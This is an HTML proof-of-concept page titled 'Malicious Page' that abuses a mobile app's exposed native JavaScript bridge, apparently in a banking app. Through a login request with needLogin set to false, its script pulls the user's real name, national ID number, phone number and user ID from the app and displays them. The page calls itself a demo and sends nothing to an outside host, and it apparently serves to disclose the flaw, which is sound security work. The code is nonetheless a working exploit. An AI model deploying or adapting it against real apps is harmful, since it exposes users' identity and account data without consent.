<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="UTF-8">
    <style>
        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
        }

        .container {
            width: 100%;
            padding: 15px;
        }

        @media screen and (min-width: 700px) {
            .container {
                width: 70%;
                margin: auto;
            }
        }

        p {
            white-space: pre-wrap; 
            word-wrap: break-word; 
            overflow-wrap: break-word; 
        }

        .bold-and-larger {
            font-weight: bold; 
            font-size: 1.5em; 
        }

        .larger {
            font-weight: bold; 
            font-size: 1.2em; 
        }

    </style>
    <title>Malicious Page</title>

</head>


<body>
    <h1>Malicious Page</h1>

    <p>!!! This is just a demo page, NO Sensitive Data will be stored!!!</p>

    <p><span class="bold-and-larger">An attacker can:</span></p>

    <p><span class="larger">Get Your Personal Info:</span></p>
    <p style="font-size: 15px;" id="RealName"></p>
    <p style="font-size: 15px;" id="NationalIDNumber"></p>
    <p style="font-size: 15px;" id="PhoneNum"></p>

    <p><span class="larger">Get Your Account Info:</span></p>
    <p style="font-size: 15px;" id="UserID"></p>
    <p style="font-size: 15px;" id="AccountNickname"></p>
    <p style="font-size: 15px;" id="AccountAvatarText">Your UC Avatar: </p>
    <div class="image-with-text">
        <img id="AccountAvatar" src="" alt="" width="30%" height="auto">
    </div>
    <p style="font-size: 15px;" id="AccountUid"></p>
    <p style="font-size: 15px;" id="AccountTicket"></p> 
    <p style="font-size: 15px;" id="AccountMobileWG"></p> 

    <p><span class="larger">Get Your Device Battery Info:</span></p>
    <p style="font-size: 15px;" id="Battery"></p>

    <script>
    
    
    CCBCallNativeFunction.callBack = function(callbackName, callbackRetval, callbackRslt){
        if(callbackName=="loginCallBack"){
            document.getElementById("RealName").innerText = "Your Name: \n" + JSON.parse(callbackRetval).data.params.Cst_Nm;
            document.getElementById("NationalIDNumber").innerText = "Your National ID Number: \n" + JSON.parse(callbackRetval).data.params.Crdt_No;
            document.getElementById("PhoneNum").innerText = "Your Phone Number: \n" + JSON.parse(callbackRetval).data.params.MblPh_No;
            document.getElementById("UserID").innerText = "Your UserID: \n" + JSON.parse(callbackRetval).data.params.Usr_ID;

        }
    }



    window.webkit.messageHandlers.CCBBridgeModel.postMessage(JSON.stringify({ 
        "methodName": "requestNative", 
        "params": {
            "action": "login",
            "params": {
                "needLogin": false
            }
        }, 
        "callBackName": "loginCallBack" 
    }));




    </script>

</body>

</html>
